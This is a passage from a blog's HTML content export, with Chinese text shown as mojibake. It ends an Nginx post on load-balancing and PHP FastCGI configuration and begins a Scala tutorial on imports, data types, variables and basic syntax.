punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-ä¼˜åŒ–æ€§é…ç½®"><a href="#3-ä¼˜åŒ–æ€§é…ç½®" class="headerlink" title="3. ä¼˜åŒ–æ€§é…ç½®"></a>3. ä¼˜åŒ–æ€§é…ç½®</h3><pre class="line-numbers language-nginx"><code class="language-nginx"><span class="token keyword">upstream</span> app <span class="token punctuation">{</span>    <span class="token keyword">server</span> <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">198.100</span><span class="token punctuation">:</span><span class="token number">8000</span> weight<span class="token operator">=</span><span class="token number">1</span> max_fails<span class="token operator">=</span><span class="token number">3</span> fail_timeout<span class="token operator">=</span>10s<span class="token punctuation">;</span>    <span class="token keyword">server</span> <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">198.101</span><span class="token punctuation">:</span><span class="token number">8000</span> weight<span class="token operator">=</span><span class="token number">1</span> max_fails<span class="token operator">=</span><span class="token number">3</span> fail_timeout<span class="token operator">=</span>10s<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">server</span> <span class="token punctuation">{</span>    <span class="token keyword">listen</span> <span class="token number">80</span><span class="token punctuation">;</span>    <span class="token keyword">server_name</span> www<span class="token punctuation">.</span>app<span class="token punctuation">.</span>com<span class="token punctuation">;</span>    <span class="token keyword">charset</span> utf<span class="token number">-8</span><span class="token punctuation">;</span>    <span class="token keyword">access_log</span> <span class="token operator">/</span>var<span class="token operator">/</span>log<span class="token operator">/</span>nginx<span class="token operator">/</span>app<span class="token punctuation">.</span>access<span class="token punctuation">.</span>log main<span class="token punctuation">;</span>    <span class="token keyword">location</span> <span class="token operator">/</span> <span class="token punctuation">{</span>        <span class="token keyword">proxy_pass</span> <span class="token keyword">http</span><span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>app<span class="token punctuation">;</span>        <span class="token keyword">proxy_set_header</span> X<span class="token operator">-</span>Real<span class="token operator">-</span>IP <span class="token variable">$remote_addr</span><span class="token punctuation">;</span>        <span class="token keyword">proxy_set_header</span> X<span class="token operator">-</span>Forwarded<span class="token operator">-</span>For <span class="token variable">$proxy_add_x_forwarded_for</span><span class="token punctuation">;</span>        <span class="token keyword">proxy_redirect</span> off<span class="token punctuation">;</span>        <span class="token keyword">proxy_connect_timeout</span> <span class="token number">30</span><span class="token punctuation">;</span>        <span class="token keyword">proxy_send_timeout</span> <span class="token number">15</span><span class="token punctuation">;</span>        <span class="token keyword">proxy_read_timeout</span> <span class="token number">15</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-PHP-è´Ÿè½½å‡è¡¡"><a href="#3-PHP-è´Ÿè½½å‡è¡¡" class="headerlink" title="3. PHP è´Ÿè½½å‡è¡¡"></a>3. PHP è´Ÿè½½å‡è¡¡</h3><pre class="line-numbers language-nginx"><code class="language-nginx"><span class="token keyword">upstream</span> phpServer <span class="token punctuation">{</span>    <span class="token keyword">ip_hash</span><span class="token punctuation">;</span>    <span class="token keyword">server</span> <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">198.130</span><span class="token punctuation">:</span><span class="token number">9000</span> max_fails<span class="token operator">=</span><span class="token number">3</span> fail_timeout<span class="token operator">=</span>10s<span class="token punctuation">;</span>    <span class="token keyword">server</span> <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">198.131</span><span class="token punctuation">:</span><span class="token number">9000</span> max_fails<span class="token operator">=</span><span class="token number">3</span> fail_timeout<span class="token operator">=</span>10s<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">#=== Fastcgi Config ===</span><span class="token keyword">fastcgi_connect_timeout</span> <span class="token number">30</span><span class="token punctuation">;</span><span class="token keyword">fastcgi_send_timeout</span> <span class="token number">30</span><span class="token punctuation">;</span><span class="token keyword">fastcgi_read_timeout</span> <span class="token number">30</span><span class="token punctuation">;</span><span class="token keyword">fastcgi_buffer_size</span>  64k<span class="token punctuation">;</span><span class="token keyword">fastcgi_buffers</span> <span class="token number">4</span> 64k<span class="token punctuation">;</span><span class="token keyword">fastcgi_busy_buffers_size</span> 128k<span class="token punctuation">;</span><span class="token keyword">fastcgi_temp_file_write_size</span> 128k<span class="token punctuation">;</span><span class="token keyword">location</span> <span class="token operator">~</span> \<span class="token punctuation">.</span><span class="token punctuation">(</span>php<span class="token operator">|</span>php5<span class="token punctuation">)</span>$ <span class="token punctuation">{</span>    <span class="token keyword">root</span> <span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>www<span class="token punctuation">.</span>app<span class="token punctuation">.</span>com<span class="token punctuation">;</span>  <span class="token keyword">fastcgi_pass</span> phpServer<span class="token punctuation">;</span>  <span class="token keyword">fastcgi_index</span> <span class="token keyword">index</span><span class="token punctuation">.</span>php<span class="token punctuation">;</span>  <span class="token keyword">fastcgi_param</span> SCRIPT_FILENAME <span class="token variable">$document_root</span><span class="token variable">$fastcgi_script_name</span><span class="token punctuation">;</span>  <span class="token keyword">include</span> fastcgi_params<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">location</span> <span class="token operator">=</span> <span class="token operator">/</span>php<span class="token operator">/</span> <span class="token punctuation">{</span>  <span class="token keyword">root</span> <span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>www<span class="token punctuation">.</span>app<span class="token punctuation">.</span>com<span class="token punctuation">;</span>  <span class="token keyword">fastcgi_pass</span> phpServer<span class="token punctuation">;</span>  <span class="token keyword">fastcgi_index</span> <span class="token keyword">index</span><span class="token punctuation">.</span>php<span class="token punctuation">;</span>  <span class="token keyword">fastcgi_param</span> SCRIPT_FILENAME <span class="token variable">$document_root</span><span class="token variable">$fastcgi_script_name</span><span class="token punctuation">;</span>  <span class="token keyword">include</span> fastcgi_params<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> è¿ç»´ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è¿ç»´ </tag>
            
            <tag> Nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Scalaå…¥é—¨</title>
      <link href="/post/54925234.html"/>
      <url>/post/54925234.html</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-Imports"><a href="#0x00-Imports" class="headerlink" title="0x00 Imports"></a>0x00 Imports</h2><h3 id="1-å½“ä»ä¸€ä¸ªåŒ…ä¸­å¼•å…¥å¤šä¸ªæ—¶ï¼Œç”¨èŠ±æ‹¬å·"><a href="#1-å½“ä»ä¸€ä¸ªåŒ…ä¸­å¼•å…¥å¤šä¸ªæ—¶ï¼Œç”¨èŠ±æ‹¬å·" class="headerlink" title="1. å½“ä»ä¸€ä¸ªåŒ…ä¸­å¼•å…¥å¤šä¸ªæ—¶ï¼Œç”¨èŠ±æ‹¬å·"></a>1. å½“ä»ä¸€ä¸ªåŒ…ä¸­å¼•å…¥å¤šä¸ªæ—¶ï¼Œ<strong>ç”¨èŠ±æ‹¬å·</strong></h3><pre class="line-numbers language-scala"><code class="language-scala"><span class="token keyword">import</span> com<span class="token punctuation">.</span>twitter<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span><span class="token punctuation">{</span>Broker<span class="token punctuation">,</span> Offer<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-å½“å¼•å…¥è¶…è¿‡-6-ä¸ªæ—¶ä½¿ï¼Œç”¨é€šé…ç¬¦"><a href="#2-å½“å¼•å…¥è¶…è¿‡-6-ä¸ªæ—¶ä½¿ï¼Œç”¨é€šé…ç¬¦" class="headerlink" title="2. å½“å¼•å…¥è¶…è¿‡ 6 ä¸ªæ—¶ä½¿ï¼Œç”¨é€šé…ç¬¦"></a><strong>2. å½“å¼•å…¥è¶…è¿‡ 6 ä¸ªæ—¶ä½¿ï¼Œç”¨é€šé…ç¬¦</strong></h3><pre class="line-numbers language-scala"><code class="language-scala"><span class="token keyword">import</span> com<span class="token punctuation">.</span>twitter<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>_<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>æ³¨ï¼šä¸è¦è½»ç‡çš„ä½¿ç”¨: ä¸€äº›åŒ…å¯¼å…¥äº†å¤ªå¤šçš„åå­—</p></blockquote><h3 id="3-é¿å…ä¸æ¸…æ™°çš„å¼•å…¥"><a href="#3-é¿å…ä¸æ¸…æ™°çš„å¼•å…¥" class="headerlink" title="3. é¿å…ä¸æ¸…æ™°çš„å¼•å…¥"></a>3. é¿å…ä¸æ¸…æ™°çš„å¼•å…¥</h3><pre class="line-numbers language-scala"><code class="language-scala"><span class="token comment" spellcheck="true">// é¿å…</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>twitter<span class="token keyword">import</span> concurrent<span class="token comment" spellcheck="true">// è€Œåº”è¯¥ä½¿ç”¨æ˜ç¡®çš„å¼•å…¥</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>twitter<span class="token punctuation">.</span>concurrent<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x01-æ³¨é‡Š"><a href="#0x01-æ³¨é‡Š" class="headerlink" title="0x01 æ³¨é‡Š"></a>0x01 æ³¨é‡Š</h2><h3 id="1-å•è¡Œæ³¨é‡Š"><a href="#1-å•è¡Œæ³¨é‡Š" class="headerlink" title="1. å•è¡Œæ³¨é‡Š"></a>1. å•è¡Œæ³¨é‡Š</h3><pre class="line-numbers language-scala"><code class="language-scala"><span class="token comment" spellcheck="true">// æˆ‘æ˜¯æ³¨é‡Šå†…å®¹ğŸ‘¨</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-å¤šè¡Œæ³¨é‡Š"><a href="#2-å¤šè¡Œæ³¨é‡Š" class="headerlink" title="2. å¤šè¡Œæ³¨é‡Š"></a>2. å¤šè¡Œæ³¨é‡Š</h3><pre class="line-numbers language-scala"><code class="language-scala"><span class="token comment" spellcheck="true">/**  * æ³¨é‡Šå†…å®¹ğŸ˜ƒ  * ...  */</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x02-æ•°æ®ç±»å‹"><a href="#0x02-æ•°æ®ç±»å‹" class="headerlink" title="0x02 æ•°æ®ç±»å‹"></a>0x02 æ•°æ®ç±»å‹</h2><h3 id="1-åŸºæœ¬æ•°æ®ç±»å‹"><a href="#1-åŸºæœ¬æ•°æ®ç±»å‹" class="headerlink" title="1. åŸºæœ¬æ•°æ®ç±»å‹"></a>1. åŸºæœ¬æ•°æ®ç±»å‹</h3><table><thead><tr><th align="center"><strong>æ•°æ®ç±»å‹</strong></th><th align="center"><strong>æè¿°</strong></th></tr></thead><tbody><tr><td align="center">Byte</td><td align="center">8bitï¼ˆ1 å­—èŠ‚ï¼‰æœ‰ç¬¦å·æ•°å­—ï¼ŒèŒƒå›´åœ¨-128 åˆ° 127</td></tr><tr><td align="center">Short</td><td align="center">16bitï¼ˆ2 å­—èŠ‚ï¼‰æœ‰ç¬¦å·æ•°å­—ï¼ŒèŒƒå›´åœ¨-32768 åˆ° 32767</td></tr><tr><td align="center">Int</td><td align="center">32bitï¼ˆ4 å­—èŠ‚ï¼‰æœ‰ç¬¦å·æ•°å­—ï¼ŒèŒƒå›´åœ¨-2147483648 åˆ° 2147483647</td></tr><tr><td align="center">Long</td><td align="center">64bitï¼ˆ8 å­—èŠ‚ï¼‰æœ‰ç¬¦å·æ•°å­—ï¼ŒèŒƒå›´åœ¨-9223372036854775808 åˆ° 9223372036854775807</td></tr><tr><td align="center">Float</td><td align="center">32bitï¼ˆ4 å­—èŠ‚ï¼‰ï¼ŒIEEE 754 æ ‡å‡†çš„å•ç²¾åº¦æµ®ç‚¹æ•°</td></tr><tr><td align="center">Double</td><td align="center">64bitï¼ˆ4 å­—èŠ‚ï¼‰ï¼ŒIEEE 754 æ ‡å‡†çš„åŒç²¾åº¦æµ®ç‚¹æ•°</td></tr><tr><td align="center">Char</td><td align="center">16bit Unicode å­—ç¬¦ï¼ŒèŒƒå›´åœ¨ U+0000 åˆ° U+FFFF</td></tr><tr><td align="center">String</td><td align="center">å­—ç¬¦ä¸²</td></tr><tr><td align="center">Boolean</td><td align="center">å¸ƒå°”ç±»å‹</td></tr><tr><td align="center">Unit</td><td align="center">è¡¨ç¤ºæ— å€¼ï¼Œå’Œ Java ä¸­ void ç­‰åŒã€‚ç”¨ä½œä¸è¿”å›ä»»ä½•ç»“æœçš„æ–¹æ³•çš„ç»“æœç±»å‹ã€‚Unit åªæœ‰ä¸€ä¸ªå®ä¾‹å€¼ï¼Œå†™æˆ()</td></tr><tr><td align="center">Null</td><td align="center">ç©ºå€¼æˆ–ç©ºå¼•ç”¨ï¼Œå”¯ä¸€å®ä¾‹æ˜¯ nullï¼ŒAnyRef çš„å­ç±»</td></tr><tr><td align="center">Nothing</td><td align="center">Nothing ç±»å‹åœ¨ Scala çš„ç±»å±‚çº§çš„æœ€ä½ç«¯ï¼›å®ƒæ˜¯ä»»ä½•å…¶ä»–ç±»å‹çš„å­ç±»å‹ï¼Œè¡¨ç¤ºæ²¡æœ‰å€¼ï¼Œæ²¡æœ‰å®ä¾‹</td></tr><tr><td align="center">Option</td><td align="center">è¡¨ç¤ºå¯èƒ½å­˜åœ¨ï¼ˆSomeï¼‰ï¼Œå¯èƒ½ä¸å­˜åœ¨ï¼ˆNoneï¼‰çš„å€¼</td></tr><tr><td align="center">None</td><td align="center">Option çš„ä¸¤ä¸ªå­ç±»ä¹‹ä¸€ï¼Œç”¨äºå®‰å…¨çš„å‡½æ•°è¿”å›å€¼ï¼Œæ¯” Null å®‰å…¨</td></tr><tr><td align="center">Some</td><td align="center">Option çš„ä¸¤ä¸ªå­ç±»ä¹‹ä¸€ï¼Œè¡¨ç¤ºåŒ…è£…äº†å€¼</td></tr><tr><td align="center">Any</td><td align="center">æ‰€æœ‰å…¶ä»–ç±»çš„è¶…ç±»</td></tr><tr><td align="center">AnyRef</td><td align="center">æ‰€æœ‰å¼•ç”¨ç±»(reference class)çš„è¶…ç±»</td></tr><tr><td align="center">AnyVal</td><td align="center">æ‰€æœ‰å€¼ç±»å‹çš„è¶…ç±»</td></tr><tr><td align="center">Nil</td><td align="center">é•¿åº¦ä¸º 0 çš„ List</td></tr></tbody></table><h3 id="2-ç±»å‹å±‚æ¬¡ç»“æ„"><a href="#2-ç±»å‹å±‚æ¬¡ç»“æ„" class="headerlink" title="2. ç±»å‹å±‚æ¬¡ç»“æ„"></a>2. ç±»å‹å±‚æ¬¡ç»“æ„</h3><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1615298394830-cf3d5f77-2284-40a7-9504-59f689346420.png#align=left&amp;display=inline&amp;height=443&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=443&amp;originWidth=1467&amp;size=96691&amp;status=done&amp;style=none&amp;width=1467" alt="image.png"><br>æ•°æ®ç±»å‹å…³ç³»å›¾</p><h3 id="3-ç±»å‹è½¬æ¢"><a href="#3-ç±»å‹è½¬æ¢" class="headerlink" title="3. ç±»å‹è½¬æ¢"></a>3. ç±»å‹è½¬æ¢</h3><p>å€¼ç±»å‹å¯ä»¥æŒ‰ç…§ä¸‹é¢çš„æ–¹å‘è¿›è¡Œå•å‘è½¬æ¢ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1615298494810-8cfd2b75-4040-4485-a015-aa1905ea1336.png#align=left&amp;display=inline&amp;height=155&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=155&amp;originWidth=677&amp;size=16322&amp;status=done&amp;style=none&amp;width=677" alt="image.png"><br>Demo</p><pre class="line-numbers language-scala"><code class="language-scala"><span class="token keyword">val</span> x<span class="token operator">:</span> <span class="token builtin">Long</span> <span class="token operator">=</span> <span class="token number">987654321</span><span class="token keyword">val</span> y<span class="token operator">:</span> <span class="token builtin">Float</span> <span class="token operator">=</span> x  <span class="token comment" spellcheck="true">// 9.8765434E8 (note that some precision is lost in this case)</span><span class="token keyword">val</span> face<span class="token operator">:</span> <span class="token builtin">Char</span> <span class="token operator">=</span> <span class="token string">'â˜º'</span><span class="token keyword">val</span> number<span class="token operator">:</span> <span class="token builtin">Int</span> <span class="token operator">=</span> face  <span class="token comment" spellcheck="true">// 9786</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x03-å˜é‡-amp-å¸¸é‡"><a href="#0x03-å˜é‡-amp-å¸¸é‡" class="headerlink" title="0x03 å˜é‡&amp;å¸¸é‡"></a>0x03 å˜é‡&amp;å¸¸é‡</h2><h3 id="1-å£°æ˜"><a href="#1-å£°æ˜" class="headerlink" title="1. å£°æ˜"></a>1. å£°æ˜</h3><p><em>å£°æ˜å˜é‡</em></p><pre class="line-numbers language-scala"><code class="language-scala"><span class="token keyword">var</span> myVar <span class="token operator">:</span> <span class="token builtin">String</span> <span class="token operator">=</span> <span class="token string">"Foo"</span><span class="token keyword">var</span> myVar <span class="token operator">:</span> <span class="token builtin">String</span> <span class="token operator">=</span> <span class="token string">"Too"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><em>å£°æ˜å¸¸é‡__ï¼ˆ</em>å¸¸é‡çš„å€¼ä¸å¯ä¿®æ”¹ï¼Œä¿®æ”¹å¸¸é‡ç¨‹åºå°†ä¼šåœ¨ç¼–è¯‘æ—¶æŠ¥é”™<em>ï¼‰</em></p><pre class="line-numbers language-scala"><code class="language-scala"><span class="token keyword">val</span> myVal <span class="token operator">:</span> <span class="token builtin">String</span> <span class="token operator">=</span> <span class="token string">"Foo"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-ç±»å‹æ¨æ–­"><a href="#2-ç±»å‹æ¨æ–­" class="headerlink" title="2. ç±»å‹æ¨æ–­"></a>2. ç±»å‹æ¨æ–­</h3><p>Scala ç¼–è¯‘å™¨é€šå¸¸å¯ä»¥æ¨æ–­å‡ºè¡¨è¾¾å¼çš„ç±»å‹ï¼Œå› æ­¤ä½ ä¸å¿…æ˜¾å¼åœ°å£°æ˜å®ƒã€‚<br>å¦‚æœåœ¨æ²¡æœ‰æŒ‡æ˜æ•°æ®ç±»å‹çš„æƒ…å†µä¸‹å£°æ˜å˜é‡æˆ–å¸¸é‡å¿…é¡»è¦ç»™å‡ºå…¶åˆå§‹å€¼ï¼Œå¦åˆ™å°†ä¼šæŠ¥é”™ã€‚</p><pre class="line-numbers language-scala"><code class="language-scala"><span class="token keyword">var</span> myVar <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token keyword">val</span> myVal <span class="token operator">=</span> <span class="token string">"Hello, Scala!"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="3-å¤šä¸ªå˜é‡å£°æ˜"><a href="#3-å¤šä¸ªå˜é‡å£°æ˜" class="headerlink" title="3. å¤šä¸ªå˜é‡å£°æ˜"></a>3. å¤šä¸ªå˜é‡å£°æ˜</h3><pre class="line-numbers language-scala"><code class="language-scala"><span class="token keyword">val</span> x<span class="token punctuation">,</span> y <span class="token operator">=</span> <span class="token number">100</span>   <span class="token comment" spellcheck="true">// x, y éƒ½å£°æ˜ä¸º100</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="0x04-åŸºæœ¬è¯­æ³•"><a href="#0x04-åŸºæœ¬è¯­æ³•" class="headerlink" title="0x04 åŸºæœ¬è¯­æ³•"></a>0x04 åŸºæœ¬è¯­æ³•</h2><h3 id="1-å›¾è§£-Scala-è¯­æ³•"><a href="#1-å›¾è§£-Scala-è¯­æ³•" class="headerlink" title="1. å›¾è§£ Scala è¯­æ³•"></a>1. å›¾è§£ Scala è¯­æ³•</h3><pre class="line-numbers language-scala"><code class="language-scala"><span class="token keyword">val</span> name<span class="token operator">:</span> <span class="token builtin">String</span> <span class="token operator">=</span> <span class="token string">"Scala"</span>println<span class="token punctuation">(</span>s<span class="token string">"å—¨ï¼Œæˆ‘æ˜¯${name}ï¼Œæ“…é•¿å¹¶å‘å’Œå¤§æ•°æ®ï¼Œä»¥è¯­æ³•ç®€æ´è€Œè‘—ç§°ã€‚"</span><span class="token punctuation">)</span>println<span class="token punctuation">(</span><span class="token string">"""æˆ‘è¯ç”Ÿäº2001å¹´ï¼Œè¯»ä½œï¼š"skah-lah"ã€‚æˆ‘çš„å‘æ˜äººæ˜¯ Martin Oderskyï¼Œä»–æ˜¯ç‘å£«æ´›æ¡‘è”é‚¦           ç†å·¥å¤§å­¦æ•™æˆï¼Œé¡¶çº§ç¼–ç¨‹è¯­è¨€å­¦å®¶ã€‚ ä»–æ›¾å‚ä¸è®¾è®¡äº†ä¸€ä¸ªåŸå‹ç³»ç»ŸGJï¼Œ æœ€ç»ˆæ¼”å˜ä¸º Java           æ³›å‹ã€‚ä»–è¿˜æ›¾å—é›‡äº Sun å…¬å¸ï¼Œç¼–å†™äº† javac çš„å‚è€ƒç¼–è¯‘å™¨ã€‚"""</span><span class="token punctuation">)</span><span class="token keyword">def</span> max<span class="token punctuation">(</span>x<span class="token operator">:</span> <span class="token builtin">Int</span><span class="token punctuation">,</span> y<span class="token operator">:</span> <span class="token builtin">Int</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">Int</span> <span class="token operator">=</span> <span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">></span> y<span class="token punctuation">)</span> <span class="token punctuation">{</span> x <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span> y <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token keyword">&lt;-</span> <span class="token number">0</span> to <span class="token number">10</span> <span class="token keyword">if</span> i <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> println<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token keyword">val</span> tuple <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">"jack"</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span>println<span class="token punctuation">(</span>s<span class="token string">"tuple: ${tuple}, name: ${tuple._1}, age: ${tuple._2}"</span><span class="token punctuation">)</span><span class="token keyword">case</span> <span class="token keyword">class</span> User<span class="token punctuation">(</span>name<span class="token operator">:</span> <span class="token builtin">String</span><span class="token punctuation">,</span> age<span class="token operator">:</span> <span class="token builtin">Int</span> <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token keyword">val</span> jack <span class="token operator">=</span> User<span class="token punctuation">(</span><span class="token string">"jack"</span><span class="token punctuation">)</span><span class="token keyword">val</span> rose <span class="token operator">=</span> User<span class="token punctuation">(</span><span class="token string">"rose"</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">)</span>println<span class="token punctuation">(</span>jack<span class="token punctuation">,</span> rose<span class="token punctuation">)</span>println<span class="token punctuation">(</span>jack<span class="token punctuation">.</span>name <span class="token operator">==</span> <span class="token string">"jack"</span><span class="token punctuation">,</span> jack <span class="token operator">==</span> User<span class="token punctuation">(</span><span class="token string">"jack"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">val</span> lambda <span class="token operator">=</span> <span class="token punctuation">(</span>x<span class="token operator">:</span> <span class="token builtin">Int</span><span class="token punctuation">,</span> y<span class="token operator">:</span> <span class="token builtin">Int</span><span class="token punctuation">)</span> <span class="token keyword">=></span> <span class="token punctuation">{</span> x <span class="token operator">+</span> y <span class="token punctuation">}</span><span class="token keyword">val</span> strings <span class="token operator">=</span> List<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token string">"2"</span><span class="token punctuation">,</span> <span class="token string">"3"</span><span class="token punctuation">,</span> <span class="token string">"4"</span><span class="token punctuation">,</span> <span class="token string">"5"</span><span class="token punctuation">)</span>println<span class="token punctuation">(</span>strings<span class="token punctuation">.</span>map<span class="token punctuation">(</span>s <span class="token keyword">=></span> s<span class="token punctuation">.</span>toInt<span class="token punctuation">)</span><span class="token punctuation">.</span>filter<span class="token punctuation">(</span>i <span class="token keyword">=></span> i <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span>mkString<span class="token punctuation">(</span><span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">val</span> page <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">val</span> users <span class="token operator">=</span> List<span class="token punctuation">(</span>jack<span class="token punctuation">,</span> rose<span class="token punctuation">)</span>println<span class="token punctuation">(</span>users<span class="token punctuation">.</span>filter<span class="token punctuation">(</span>u <span class="token keyword">=></span> u<span class="token punctuation">.</span>age <span class="token operator">>=</span> <span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">.</span>sortBy<span class="token punctuation">(</span>u <span class="token keyword">=></span> <span class="token punctuation">(</span>u<span class="token punctuation">.</span>name<span class="token punctuation">,</span> u<span class="token punctuation">.</span>age<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>slice<span class="token punctuation">(</span><span class="token number">10</span><span class="token operator">*</span><span class="token punctuation">(</span>page <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">val</span> map <span class="token operator">=</span> Map<span class="token punctuation">(</span><span class="token string">"jack"</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token string">"rose"</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token number">18</span><span class="token punctuation">)</span>println<span class="token punctuation">(</span>map<span class="token punctuation">(</span><span class="token string">"jack"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">val</span> User<span class="token punctuation">(</span>jackName<span class="token punctuation">,</span> jackAge<span class="token punctuation">)</span> <span class="token operator">=</span> jackprintln<span class="token punctuation">(</span>jackName<span class="token punctuation">,</span> jackAge<span class="token punctuation">)</span>jack <span class="token keyword">match</span> <span class="token punctuation">{</span>  <span class="token keyword">case</span> User<span class="token punctuation">(</span>name<span class="token punctuation">,</span> age<span class="token punctuation">)</span> <span class="token keyword">if</span> name <span class="token operator">==</span> <span class="token string">"jack"</span> <span class="token keyword">=></span> println<span class="token punctuation">(</span>s<span class="token string">"jack matched."</span><span class="token punctuation">)</span>  <span class="token keyword">case</span> other <span class="token keyword">=></span> println<span class="token punctuation">(</span>s<span class="token string">"Hello, ${other.name}"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1615296230827-0bc1a3ac-0ccd-4514-b167-8efafecf028c.png#align=left&amp;display=inline&amp;height=1394&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=1394&amp;originWidth=1918&amp;size=561688&amp;status=done&amp;style=none&amp;width=1918" alt="image.png"></p><h2 id="0x05-å…ƒç»„"><a href="#0x05-å…ƒç»„" class="headerlink" title="0x05 å…ƒç»„"></a>0x05 å…ƒç»„</h2><h3 id="1-ç®€ä»‹"><a href="#1-ç®€ä»‹" class="headerlink" title="1. ç®€ä»‹"></a>1. ç®€ä»‹</h3><p>åœ¨ Scala ä¸­ï¼Œå…ƒç»„æ˜¯ä¸€ä¸ªå¯ä»¥å®¹çº³ä¸åŒç±»å‹å…ƒç´ çš„ç±»ï¼Œå…ƒç»„æ˜¯ä¸å¯å˜çš„ã€‚<br>å½“æˆ‘ä»¬éœ€è¦ä»å‡½æ•°è¿”å›å¤šä¸ªå€¼æ—¶ï¼Œå…ƒç»„ä¼šæ´¾ä¸Šç”¨åœºã€‚</p><h3 id="2-å®šä¹‰"><a href="#2-å®šä¹‰" class="headerlink" title="2. å®šä¹‰"></a>2. å®šä¹‰</h3><pre class="line-numbers language-scala"><code class="language-scala"><span class="token keyword">val</span> ingredient <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">"Sugar"</span> <span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">)</span><span class="token operator">:</span>Tuple2<span class="token punctuation">[</span><span class="token builtin">String</span><span class="token punctuation">,</span> <span class="token builtin">Int</span><span class="token punctuation">]</span><span aria-hidden="true" 